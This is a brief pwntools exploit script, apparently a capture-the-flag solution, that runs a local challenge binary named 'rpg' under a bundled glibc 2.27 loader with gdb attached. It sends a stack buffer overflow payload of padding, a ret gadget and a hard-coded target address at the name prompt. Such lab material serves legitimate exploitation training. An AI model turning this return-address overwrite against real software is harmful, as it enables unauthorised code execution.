#!/usr/bin/env python3
from pwn import*
from pathlib import Path
context.arch='amd64'
context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
here = Path(__file__).resolve().parent
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / 'libc/2.27/amd64/ld-linux-x86-64.so.2'
libdir = pwn_root / 'libc/2.27/amd64/glibc227/glibc227-fixed/lib/x86_64-linux-gnu'
io=process([str(loader), '--library-path', str(libdir), str(here / 'rpg')])
gdb.attach(io,'''
b main
c
''')
addr=0x0400A04 
ret=0x0400B16
padding=0x4+8
p=b'a'*padding+p64(ret)+p64(addr)
io.sendlineafter(b'Enter your name:',p)
io.interactive()
